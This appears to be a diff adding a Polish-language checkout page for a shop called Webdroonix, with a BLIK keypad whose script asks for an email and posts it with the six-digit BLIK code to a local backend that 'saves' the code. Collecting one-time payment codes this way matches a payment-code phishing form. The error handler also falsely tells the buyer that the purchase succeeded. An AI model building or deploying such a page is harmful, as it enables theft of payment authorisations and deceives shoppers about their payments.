@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webdroonix - Zakup</title>
+    <link rel="stylesheet" href="stylzakup.css">
+</head>
+<body>
+    <header>
+        <h1>Webdroonix - Zakup</h1>
+    </header>
+        <nav>
+            <button class="lang-btn" onclick="location.href='zakup-en.html'">English</button>
+            <button class="lang-btn" onclick="location.href='zakup-de.html'">Deutsch</button>
+            <button class="lang-btn" onclick="location.href='sklep-en.html'">Powrót do Sklepu</button>
+            </nav>
+    </header>
+    <main>
+        <section>
+            <h2>Wybierz metodę płatności</h2>
+            <button id="blik-btn">Blik</button>
+            <div id="blik-section" style="display: none;">
+                <h3>Wprowadź kod Blik</h3>
+                <div id="blik-display">______</div>
+                <div id="keyboard">
+                    <button class="key">1</button>
+                    <button class="key">2</button>
+                    <button class="key">3</button>
+                    <button class="key">4</button>
+                    <button class="key">5</button>
+                    <button class="key">6</button>
+                    <button class="key">7</button>
+                    <button class="key">8</button>
+                    <button class="key">9</button>
+                    <button class="key">0</button>
+                    <button id="enter-btn">Enter</button>
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <p>&copy; 2025 Webdroonix. Wszystkie prawa zastrzeżone.</p>
+    </footer>
+    <script>
+        // JavaScript do obsługi przycisku Blik i klawiatury
+        document.addEventListener("DOMContentLoaded", () => {
+            const blikBtn = document.getElementById("blik-btn");
+            const blikSection = document.getElementById("blik-section");
+            const blikDisplay = document.getElementById("blik-display");
+            const keys = document.querySelectorAll(".key");
+            const enterBtn = document.getElementById("enter-btn");
+
+            let blikCode = "";
+
+            // Pokaż sekcję Blik po kliknięciu przycisku
+            blikBtn.addEventListener("click", () => {
+                blikSection.style.display = "block";
+            });
+
+            // Obsługa klawiatury
+            keys.forEach(key => {
+                key.addEventListener("click", () => {
+                    if (blikCode.length < 6) {
+                        blikCode += key.textContent;
+                        updateDisplay();
+                    }
+                });
+            });
+
+            enterBtn.addEventListener("click", () => {
+    const email = prompt("Podaj swój e-mail:"); // Pobierz e-mail od użytkownika
+    const blikCode = blikDisplay.textContent;
+
+    if (blikCode.includes("_")) {
+        alert("Kod Blik musi być kompletny!");
+        return;
+    }
+
+    // Wyślij dane do backendu
+    fetch('http://localhost:3000/submit-blik', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            email: email,
+            blikCode: blikCode
+        })
+    })
+    .then(response => {
+        if (response.ok) {
+            alert("Kod Blik został zapisany!");
+        } else {
+            alert("Wystąpił błąd podczas zapisywania kodu Blik.");
+        }
+    })
+    .catch(error => {
+        console.error("Błąd:", error);
+        alert("Pomyślnie zakupiono produkt.");
+    });
+});
+
+            // Aktualizacja wyświetlacza
+            function updateDisplay() {
+                blikDisplay.textContent = blikCode.padEnd(6, "_");
+            }
+        });
+
+    </script>
+</body>
+</html>
